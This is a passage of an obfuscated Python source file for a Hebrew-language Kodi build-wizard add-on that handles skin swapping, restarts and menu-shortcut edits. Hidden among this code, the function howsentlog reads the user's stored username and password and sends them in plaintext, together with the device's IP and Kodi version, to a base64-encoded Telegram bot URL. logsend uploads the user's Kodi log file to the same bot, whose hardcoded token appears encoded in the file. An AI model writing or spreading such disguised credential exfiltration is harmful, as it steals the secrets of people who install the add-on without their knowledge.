# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O00O0OOOO0O000O00 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	O0O0O0OOOOOOO0OOO =[];O00OO00O0OOO00OOO =[]#line:261
	for O00OOOOO000O0O00O in sorted (O00O0OOOO0O000O00 ,key =lambda OO00O000OO00O0OO0 :OO00O000OO00O0OO0 ):#line:262
		OOO0OO00000O00OO0 =os .path .split (O00OOOOO000O0O00O [:-1 ])[1 ]#line:263
		O0O0O0OOOOOO0OO00 =os .path .join (O00OOOOO000O0O00O ,'addon.xml')#line:264
		if os .path .exists (O0O0O0OOOOOO0OO00 ):#line:265
			O0000OOOOO0OO0000 =open (O0O0O0OOOOOO0OO00 )#line:266
			O0O00OO0O0OOO0OO0 =O0000OOOOO0OO0000 .read ()#line:267
			OO0000O0OOO00OOOO =parseDOM2 (O0O00OO0O0OOO0OO0 ,'addon',ret ='id')#line:268
			O00OO0OO000O00O00 =OOO0OO00000O00OO0 if len (OO0000O0OOO00OOOO )==0 else OO0000O0OOO00OOOO [0 ]#line:269
			try :#line:270
				O000OO0O00OO0O000 =xbmcaddon .Addon (id =O00OO0OO000O00O00 )#line:271
				O0O0O0OOOOOOO0OOO .append (O000OO0O00OO0O000 .getAddonInfo ('name'))#line:272
				O00OO00O0OOO00OOO .append (O00OO0OO000O00O00 )#line:273
			except :#line:274
				pass #line:275
	OO00O0OOO0OO0O00O =[];OO0OOOO00OOOOOO00 =0 #line:276
	O00OO0O0O000OOOO0 =["Current Skin -- %s"%currSkin ()]+O0O0O0OOOOOOO0OOO #line:277
	OO0OOOO00OOOOOO00 =DIALOG .select ("Select the Skin you want to swap with.",O00OO0O0O000OOOO0 )#line:278
	if OO0OOOO00OOOOOO00 ==-1 :return #line:279
	else :#line:280
		OOOO000O0OO0OOOO0 =(OO0OOOO00OOOOOO00 -1 )#line:281
		OO00O0OOO0OO0O00O .append (OOOO000O0OO0OOOO0 )#line:282
		O00OO0O0O000OOOO0 [OO0OOOO00OOOOOO00 ]="%s"%(O0O0O0OOOOOOO0OOO [OOOO000O0OO0OOOO0 ])#line:283
	if OO00O0OOO0OO0O00O ==None :return #line:284
	for OO0OO0OO0OO0OO0O0 in OO00O0OOO0OO0O00O :#line:285
		swapSkins (O00OO00O0OOO00OOO [OO0OO0OO0OO0OO0O0 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (O0OO0OO00O00O0OO0 ,title ="Error"):#line:290
	O0O0OO0O0O0000OOO ='lookandfeel.skin'#line:291
	O0O0O0O0O000O00OO =O0OO0OO00O00O0OO0 #line:292
	OO0O00OOO00000O00 =getOld (O0O0OO0O0O0000OOO )#line:293
	OOOOO0O0O00O000OO =O0O0OO0O0O0000OOO #line:294
	setNew (OOOOO0O0O00O000OO ,O0O0O0O0O000O00OO )#line:295
	OO0000OO0000O0OO0 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OO0000OO0000O0OO0 <100 :#line:297
		OO0000OO0000O0OO0 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (OOOO00OO0OOOOO000 ):#line:304
	try :#line:305
		OOOO00OO0OOOOO000 ='"%s"'%OOOO00OO0OOOOO000 #line:306
		O0OOO0O0000O00000 ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OOOO00OO0OOOOO000 )#line:307
		OO0OO00O0O0OOOO00 =xbmc .executeJSONRPC (O0OOO0O0000O00000 )#line:309
		OO0OO00O0O0OOOO00 =simplejson .loads (OO0OO00O0O0OOOO00 )#line:310
		if OO0OO00O0O0OOOO00 .has_key ('result'):#line:311
			if OO0OO00O0O0OOOO00 ['result'].has_key ('value'):#line:312
				return OO0OO00O0O0OOOO00 ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0OOO00O00OO00OO0 ,O0000O00OO000OOOO ):#line:319
	try :#line:320
		O0OOO00O00OO00OO0 ='"%s"'%O0OOO00O00OO00OO0 #line:321
		O0000O00OO000OOOO ='"%s"'%O0000O00OO000OOOO #line:322
		O00O0O0O00OO0OO00 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0OOO00O00OO00OO0 ,O0000O00OO000OOOO )#line:323
		O0OOOOOOO0OOO0000 =xbmc .executeJSONRPC (O00O0O0O00OO0OO00 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO000OO000OO000O0 =xbmcgui .DialogProgress ()#line:334
			OO000OO000OO000O0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO000OO000OO000O0 .update (0 )#line:338
			for O0OOOO00OO00OO000 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO000OO000OO000O0 .update (int ((5 -O0OOOO00OO00OO000 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOOO00OO00OO000 ),'')#line:341
				if OO000OO000OO000O0 .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO000OO000OO000O0 =xbmcgui .DialogProgress ()#line:347
			OO000OO000OO000O0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO000OO000OO000O0 .update (0 )#line:351
			for O0OOOO00OO00OO000 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO000OO000OO000O0 .update (int ((5 -O0OOOO00OO00OO000 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOOO00OO00OO000 ),'')#line:354
				if OO000OO000OO000O0 .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def testcommand ():#line:365
  wiz .kodi17Fix ()#line:366
def howsentlog ():#line:368
       try :#line:369
          import json #line:370
          OO0OOOOOOOO0O0000 =(ADDON .getSetting ("user"))#line:371
          O00OO0O0OOOOO0O00 =(ADDON .getSetting ("pass"))#line:372
          OOOOOOOOOO00OOOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:373
          OOOOO00O00OOO000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:375
          O0O0OOOOO0OOOO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:376
          O00OOO0O00OOOOO0O =str (json .loads (O0O0OOOOO0OOOO0O0 )['ip'])#line:377
          O0OOOO000000O00O0 =OO0OOOOOOOO0O0000 #line:378
          O0000O00O000O000O =O00OO0O0OOOOO0O00 #line:379
          import socket #line:381
          O0O0OOOOO0OOOO0O0 =urllib2 .urlopen (OOOOO00O00OOO000O .decode ('base64')+' - '+O0OOOO000000O00O0 +' - '+O0000O00O000O000O +' - '+OOOOOOOOOO00OOOO0 ).readlines ()#line:382
       except :pass #line:383
def googleindicat ():#line:386
			import logg #line:387
			OO0OO0OO0000O00O0 =(ADDON .getSetting ("pass"))#line:388
			OO00OOO000OO00000 =(ADDON .getSetting ("user"))#line:389
			logg .logGA (OO0OO0OO0000O00O0 ,OO00OOO000OO00000 )#line:390
def logsend ():#line:391
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:392
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:393
      howsentlog ()#line:395
      import requests #line:396
      if xbmc .getCondVisibility ('system.platform.windows'):#line:397
         OOOOOO0OOO0O0OOOO =xbmc .translatePath ('special://home/kodi.log')#line:398
         OOO0OOOO00OO0OOOO ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0OOO0O0OOOO ,open (OOOOOO0OOO0O0OOOO ,'rb')),}#line:402
         O00OOOO00O0OO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:403
         OOO0000OO0O000O00 =requests .post (O00OOOO00O0OO0OO0 .decode ('base64'),files =OOO0OOOO00OO0OOOO )#line:405
      elif xbmc .getCondVisibility ('system.platform.android'):#line:406
           OOOOOO0OOO0O0OOOO =xbmc .translatePath ('special://temp/kodi.log')#line:407
           OOO0OOOO00OO0OOOO ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0OOO0O0OOOO ,open (OOOOOO0OOO0O0OOOO ,'rb')),}#line:411
           O00OOOO00O0OO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:412
           OOO0000OO0O000O00 =requests .post (O00OOOO00O0OO0OO0 .decode ('base64'),files =OOO0OOOO00OO0OOOO )#line:414
      else :#line:415
           OOOOOO0OOO0O0OOOO =xbmc .translatePath ('special://kodi.log')#line:416
           OOO0OOOO00OO0OOOO ={'chat_id':(None ,'-274262389'),'document':(OOOOOO0OOO0O0OOOO ,open (OOOOOO0OOO0O0OOOO ,'rb')),}#line:420
           O00OOOO00O0OO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:421
           OOO0000OO0O000O00 =requests .post (O00OOOO00O0OO0OO0 .decode ('base64'),files =OOO0OOOO00OO0OOOO )#line:423
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:424
def rdoff ():#line:426
	resloginit .resloginit ('restore','all')#line:428
	OO0OO0000O0OO000O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:429
	O000O0O0000O0000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:430
	copyfile (OO0OO0000O0OO000O ,O000O0O0000O0000O )#line:431
def skindialogsettind18 ():#line:432
	try :#line:433
		OO0OOOO00OO0OOOOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:434
		OOO0OO0OOOOOOO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:435
		copyfile (OO0OOOO00OO0OOOOO ,OOO0OO0OOOOOOO000 )#line:436
	except :pass #line:437
def rdon ():#line:438
	loginit .loginIt ('restore','all')#line:439
	O0OO0OOOO0OOO00O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:441
	O00O00O00O0OOO000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:442
	copyfile (O0OO0OOOO0OOO00O0 ,O00O00O00O0OOO000 )#line:443
def adults18 ():#line:445
  O00O0OO0OOO00000O =(ADDON .getSetting ("adults"))#line:446
  if O00O0OO0OOO00000O =='true':#line:447
    O000OO00OOO0OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:448
    with open (O000OO00OOO0OOOOO ,'r')as OOOO000OOOOOOOO00 :#line:449
      O0OO00OOOO00OOOO0 =OOOO000OOOOOOOO00 .read ()#line:450
    O0OO00OOOO00OOOO0 =O0OO00OOOO00OOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:468
    with open (O000OO00OOO0OOOOO ,'w')as OOOO000OOOOOOOO00 :#line:471
      OOOO000OOOOOOOO00 .write (O0OO00OOOO00OOOO0 )#line:472
def rdbuildaddon ():#line:473
  O000OO0OO0000OO0O =(ADDON .getSetting ("rdbuild"))#line:474
  if O000OO0OO0000OO0O =='true':#line:475
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:476
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:477
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:478
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:496
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:499
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:500
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:504
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:505
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:506
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:524
    with open (O00000OOOO00O00O0 ,'w')as OO0000OO0OOOOOOO0 :#line:527
      OO0000OO0OOOOOOO0 .write (O0OO0O0O00OOOOOO0 )#line:528
    O00000OOOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:532
    with open (O00000OOOO00O00O0 ,'r')as OO0000OO0OOOOOOO0 :#line:533
      O0OO0O0O00OOOOOO0 =OO0000OO0OOOOOOO0 .read ()#line:534
    O0OO0O0O00OOOOOO0 =O0OO0O0O00OOOOOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
